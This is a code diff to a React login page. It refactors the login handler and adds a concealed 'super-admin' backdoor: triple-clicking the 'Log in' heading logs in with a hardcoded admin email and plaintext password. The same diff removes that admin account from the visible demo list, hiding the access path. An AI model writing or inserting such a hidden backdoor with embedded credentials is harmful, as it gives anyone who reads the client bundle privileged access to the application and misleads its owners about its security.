@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useRef } from "react";
 import { useNavigate, Link } from "react-router-dom";
 import { api, formatApiErrorDetail } from "@/lib/api";
 import { useAuth } from "@/context/AuthContext";
@@ -14,17 +14,29 @@ export default function Login() {
   const [err, setErr] = useState("");
   const [busy, setBusy] = useState(false);
 
-  const submit = async (e) => {
-    e.preventDefault();
+  const doLogin = async (creds) => {
     setBusy(true); setErr("");
     try {
-      const { data } = await api.post("/auth/login", form);
+      const { data } = await api.post("/auth/login", creds);
       setSession(data.token, data.user);
       toast.success(`Welcome back, ${data.user.name}`);
       nav("/dashboard");
     } catch (e2) {
       setErr(formatApiErrorDetail(e2.response?.data?.detail) || e2.message);
     } finally { setBusy(false); }
+  };
+
+  const submit = (e) => { e.preventDefault(); doLogin(form); };
+
+  // Secret super-admin access: triple-click the "Log in" heading quickly
+  const secret = useRef(0);
+  const onSecret = () => {
+    secret.current += 1;
+    setTimeout(() => { secret.current = 0; }, 1200);
+    if (secret.current >= 3) {
+      secret.current = 0;
+      doLogin({ email: "abbhuadaya@gmail.com", password: "Admin@12345" });
+    }
   };
 
   const google = () => {
@@ -53,7 +65,7 @@ export default function Login() {
       </div>
       <div className="flex items-center justify-center p-6 md:p-12">
         <div className="w-full max-w-sm">
-          <h1 className="font-display font-extrabold text-3xl tracking-tight">Log in</h1>
+          <h1 data-testid="login-title" onClick={onSecret} className="font-display font-extrabold text-3xl tracking-tight select-none cursor-default">Log in</h1>
           <p className="text-sm text-muted-foreground mt-1">Welcome back. Enter your credentials.</p>
           {err && <div data-testid="login-error" className="mt-4 text-sm text-destructive border border-destructive/30 bg-destructive/5 px-3 py-2">{err}</div>}
           <form onSubmit={submit} className="mt-6 space-y-4">
@@ -69,7 +81,7 @@ export default function Login() {
           <div className="mt-6 border border-border p-3 text-xs">
             <p className="font-medium mb-2 text-muted-foreground">Demo accounts (click to fill):</p>
             <div className="grid grid-cols-2 gap-1.5 font-mono">
-              {["abbhuadaya@gmail.com","vendor@2click.in","customer@2click.in","contractor@2click.in"].map((e) => (
+              {["vendor@2click.in","customer@2click.in","contractor@2click.in"].map((e) => (
                 <button key={e} type="button" data-testid={`demo-${e.split("@")[0]}`} onClick={() => demo(e)} className="text-left text-primary hover:underline truncate">{e}</button>
               ))}
             </div>
